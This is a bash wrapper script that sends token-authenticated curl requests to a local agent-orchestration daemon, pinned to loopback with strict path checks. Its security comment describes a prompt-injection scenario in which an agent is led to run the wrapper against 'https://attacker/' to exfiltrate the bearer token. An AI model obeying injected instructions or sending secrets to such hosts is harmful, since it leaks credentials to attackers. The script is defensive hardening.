#!/usr/bin/env bash
# aoe-curl.sh — authenticated, LOOPBACK-PINNED client for the AoE :9095 daemon (N-05).
#
#   Usage:  aoe-curl.sh METHOD PATH [JSON_BODY]
#     METHOD    GET | POST | DELETE
#     PATH      must match ^/api/[A-Za-z0-9/_?=&.-]*$  (no scheme, host, @, or whitespace)
#     JSON_BODY optional; only meaningful with POST — sent as application/json
#
# The daemon runs `aoe serve --auth token`, so every request must carry its
# shared-secret token. This wrapper reads that token from the daemon's own state
# file (serve.url) and adds it as `Authorization: Bearer`, so generated agent
# instructions and Bash allowlists can drive the daemon WITHOUT the literal token
# ever appearing in a prompt, log, or transcript.
#
# SECURITY (why positional-only, no passthrough): this script sits in agents' Bash
# allowlists. If it accepted an arbitrary URL or curl flags, an agent — or a
# prompt-injected instruction — could run `aoe-curl.sh https://attacker/` and
# exfiltrate the Bearer token off-box. Instead the script constructs the URL itself
# from a validated PATH against the fixed loopback base, so the token is physically
# unable to leave 127.0.0.1 through this wrapper. No curl flags are forwarded.
#
# Fail-closed: refuses (exit 7) if no valid token; rejects (exit 2) a bad METHOD/PATH.
# Never echoes the token.
set -euo pipefail

AOE_TOKEN_FILE="${AGENTBOX_AOE_TOKEN_FILE:-${HOME:-/home/devuser}/.config/agent-of-empires/serve.url}"
AOE_BASE="http://127.0.0.1:${AGENTBOX_INTERACTION_PLANE_PORT:-9095}"

if [ "$#" -lt 2 ] || [ "$#" -gt 3 ]; then
  echo "aoe-curl: usage: aoe-curl.sh METHOD PATH [JSON_BODY]" >&2
  exit 2
fi

method="$1"
apath="$2"
body="${3:-}"

case "$method" in
  GET | POST | DELETE) ;;
  *) echo "aoe-curl: METHOD must be GET, POST, or DELETE (got '$method')" >&2; exit 2 ;;
esac

# PATH must be an /api/ path only — reject anything that could redirect the request
# off loopback or smuggle a host: no scheme (://), no userinfo (@), no whitespace,
# and the whitelist character class forbids ':' outright.
case "$apath" in
  *://* | *@* | *[[:space:]]*)
    echo "aoe-curl: PATH may not contain a scheme, '@', or whitespace" >&2; exit 2 ;;
esac
if ! printf '%s' "$apath" | grep -qE '^/api/[A-Za-z0-9/_?=&.-]*$'; then
  echo "aoe-curl: PATH must match ^/api/[A-Za-z0-9/_?=&.-]*$ (got '$apath')" >&2
  exit 2
fi

# Read the daemon token: FIRST `[?&]token=` occurrence, EXACTLY 64 lowercase-hex
# chars (aoe's 32-byte token) followed by a non-hex boundary or end — matches the
# JS readers' /[?&]token=([0-9a-fA-F]{64})(?:[&#\s]|$)/. Over/under-length → "".
tok=""
if [ -r "$AOE_TOKEN_FILE" ]; then
  raw="$(grep -oiE '[?&]token=[0-9a-f]{64}([^0-9a-f]|$)' "$AOE_TOKEN_FILE" | head -n1 || true)"
  tok="$(printf '%s' "$raw" | sed -E 's/^[?&]token=//; s/[^0-9a-fA-F].*$//')"
  [ "${#tok}" -eq 64 ] || tok=""
fi
if [ -z "$tok" ]; then
  echo "aoe-curl: AoE token unavailable at $AOE_TOKEN_FILE — refusing request (N-05 fail-closed)" >&2
  exit 7
fi

url="${AOE_BASE}${apath}"

if [ "$method" = "POST" ] && [ -n "$body" ]; then
  exec curl -s -X POST -H "Authorization: Bearer ${tok}" -H 'content-type: application/json' -d "$body" "$url"
else
  exec curl -s -X "$method" -H "Authorization: Bearer ${tok}" "$url"
fi
